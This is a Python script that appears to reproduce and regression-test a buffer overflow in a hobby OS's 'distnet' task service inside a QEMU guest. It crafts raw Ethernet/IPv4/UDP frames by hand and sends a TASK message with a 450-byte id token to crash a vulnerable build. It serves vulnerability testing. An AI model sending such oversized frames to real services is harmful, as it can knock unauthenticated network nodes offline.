#!/usr/bin/env python3
"""Reproduce (and later, verify the fix for) the distnet TASK overflow.

WHY THIS CAN EXIST AT ALL
  Under QEMU SLIRP the host cannot initiate UDP into a guest, so every existing
  distnet test has the guest dial OUT. This one sends IN, which is the direction an
  attacker needs. Two transports are supported here and they are NOT interchangeable:

    --tcp   connect to QEMU's -net socket,listen=127.0.0.1:PORT.  That backend is TCP,
            not UDP (an earlier comment in test_distnet_2vm.py said UDP and misled
            three attempts before it was caught).  One Ethernet frame per write(),
            no length prefix.  Use --tcp for the socket-tunnel route.

    --raw   send the bare payload as one UDP datagram to a host port mapped with
            SLIRP hostfwd=udp::HOSTPORT-:5456.  No Ethernet framing; QEMU does the
            delivery.  Useful as a fallback.

  In both cases the tunnel/mapping is unauthenticated - there is no notion of a peer
  to check against, which is the whole point of this reproduction.

TOPOLOGY
  boot ONE guest with:   -net socket,listen=127.0.0.1:1234
  in the guest:          login, then run  `distnet compute`   (binds UDP 5456)
  on the host:           this script, which crafts frames and sends them to :1234

FRAME for --tcp mode (IPv4/UDP, no scapy - the VM and the host Python both lack it)
  eth  dst = ff:ff:ff:ff:ff:ff   (broadcast; the guest NIC already reports
                                 MAC=FF:FF:FF:FF:FF:FF in its own serial log)
       src = 02:00:00:00:00:99, type 0x0800
  ipv4 src/dst = 10.0.2.2 / <guest ip>, proto 17, TTL 64, header checksum correct
  udp  sport 40000, dport <task port 5456>, checksum 0 (legal for IPv4)
  payload      = b"TASK " + id + b" sum 1"

USAGE
  python3 tools/verify/test_distnet_oversize.py probe
      sends TASK 1 sum 1 2  -> proves the tunnel reaches the guest node. Run this
      FIRST: if probe does not produce a RESULT in the guest serial, nothing else
      here means anything.
  python3 tools/verify/test_distnet_oversize.py attack [--idlen 450]
      sends a TASK whose id token is --idlen bytes. Against a vulnerable build it
      should corrupt/hang the node; against the fixed build the echoed id is
      truncated to 15 chars and the node keeps serving.

OPTIONS
  --sock 127.0.0.1:1234   the socket tunnel endpoint (QEMU listen side)
  --dst-ip 10.0.2.15      the guest IP as logged by its own [NET] line
  --port 5456             DN_TASK_PORT
  --idlen 450             attack mode: id token length
  --repeat 1              send the frame this many times
  --dry                   build and print the frame, send nothing
"""
import argparse
import time
import socket
import struct
import sys

BCAST = b"\xff" * 6
SRC_MAC = bytes.fromhex("020000000099")


def ip_checksum(hdr: bytes) -> int:
    if len(hdr) % 2:
        hdr += b"\x00"
    s = 0
    for i in range(0, len(hdr), 2):
        s += (hdr[i] << 8) | hdr[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def ipv4(a: str) -> bytes:
    return socket.inet_aton(a)


def build_frame(src_ip: str, dst_ip: str, dst_port: int, payload: bytes) -> bytes:
    udp_len = 8 + len(payload)
    udp = struct.pack("!HHHH", 40000, dst_port, udp_len, 0) + payload
    total = 20 + len(udp)
    ip = struct.pack("!BBHHHBBH4s4s",
                     0x45, 0, total, 0x1234, 0, 64, 17, 0,
                     ipv4(src_ip), ipv4(dst_ip))
    csum = ip_checksum(ip)
    ip = ip[:10] + struct.pack("!H", csum) + ip[12:]
    eth = BCAST + SRC_MAC + struct.pack("!H", 0x0800)
    return eth + ip + udp


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["probe", "attack"])
    ap.add_argument("--sock", default="127.0.0.1:1234")
    ap.add_argument("--dst-ip", default="10.0.2.15")
    ap.add_argument("--src-ip", default="10.0.2.2")
    ap.add_argument("--port", type=int, default=5456)
    ap.add_argument("--idlen", type=int, default=450)
    ap.add_argument("--repeat", type=int, default=1)
    ap.add_argument("--raw", action="store_true",
                    help="send the bare payload as one plain UDP datagram instead of an"
                         " Ethernet frame; use with a SLIRP hostfwd=udp mapping")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--tcp", action="store_true",
                    help="connect over TCP instead of UDP. QEMU's -net socket,listen= is a"
                         " TCP tunnel (the 2vm harness comment calling it UDP is wrong), and"
                         " it sends one Ethernet frame per write() with no length prefix.")
    ap.add_argument("--dry", action="store_true")
    a = ap.parse_args()

    if a.mode == "probe":
        tid, note = b"1", "benign id, must yield RESULT 1 ok 3 in the guest serial"
    else:
        tid, note = b"A" * a.idlen, "oversized id token (%d bytes)" % a.idlen
    payload = b"TASK " + tid + b" sum 1 2"
    frame = build_frame(a.src_ip, a.dst_ip, a.port, payload)

    print("[oversize] mode=%s  %s" % (a.mode, note))
    if a.raw:
        print("[oversize] RAW payload=%d bytes -> %s:%d (SLIRP hostfwd path)"
              % (len(payload), a.host, a.port))
        if a.dry:
            print("[oversize] --dry: nothing sent"); return 0
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(a.repeat):
            s.sendto(payload, (a.host, a.port))
        s.close()
        print("[oversize] sent %d raw datagram(s)" % a.repeat)
        return 0
    print("[oversize] frame=%d bytes  payload=%d  ip.dst=%s  udp.dport=%d"
          % (len(frame), len(payload), a.dst_ip, a.port))
    print("[oversize] head: %s" % frame[:42].hex(" "))
    if a.dry:
        print("[oversize] --dry: nothing sent")
        return 0

    host, port = a.sock.rsplit(":", 1)
    if a.tcp:
        s = socket.create_connection((host, int(port)), timeout=5)
        for i in range(a.repeat):
            s.sendall(frame)          # one frame == one write, no length prefix
            print("[oversize] sent #%d (tcp) to %s" % (i + 1, a.sock))
            time.sleep(0.1)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(a.repeat):
            s.sendto(frame, (host, int(port)))
            print("[oversize] sent #%d to %s" % (i + 1, a.sock))
    s.close()
    print("[oversize] done. Now read the guest serial:")
    if a.mode == "probe":
        print("    expect  [DISTNET] task done ... : RESULT 1 ok 3")
        print("    if that is absent, the tunnel/ip/mac is wrong - fix THIS first.")
    else:
        print("    vulnerable build: corruption / hang / fault")
        print("    fixed build:      RESULT AAAA... (truncated to 15) ok 3, node lives")
    return 0


if __name__ == "__main__":
    sys.exit(main())